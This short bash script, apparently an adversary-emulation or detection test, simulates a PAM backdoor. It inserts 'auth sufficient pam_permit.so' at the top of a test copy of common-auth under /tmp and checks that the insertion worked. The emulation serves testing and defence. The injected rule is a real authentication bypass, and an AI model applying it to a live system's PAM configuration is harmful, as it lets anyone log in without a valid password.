#!/bin/bash

echo "[*] EMULATION: Simulating PAM module injection attack."

PAM_CONF_PATH="/tmp/test_pam.d/common-auth"
MALICIOUS_RULE="auth sufficient pam_permit.so"

echo "[1] Current PAM configuration:"
echo "---"
cat "$PAM_CONF_PATH"
echo "---"

echo "[2] Injecting malicious rule: '$MALICIOUS_RULE'..."
# Используем sed для вставки правила в начало файла.
# В реальной атаке использовалась бы команда с sudo.
sed -i "1s,^,$MALICIOUS_RULE\n,g" "$PAM_CONF_PATH"

echo "[3] New PAM configuration after injection:"
echo "---"
cat "$PAM_CONF_PATH"
echo "---"

# Проверяем, что правило было добавлено
if grep -q "$MALICIOUS_RULE" "$PAM_CONF_PATH"; then
    echo "[*] SUCCESS: Malicious PAM rule injected."
else
    echo "[-] ERROR: Failed to inject PAM rule."
fi

echo "[*] EMULATION: Finished."
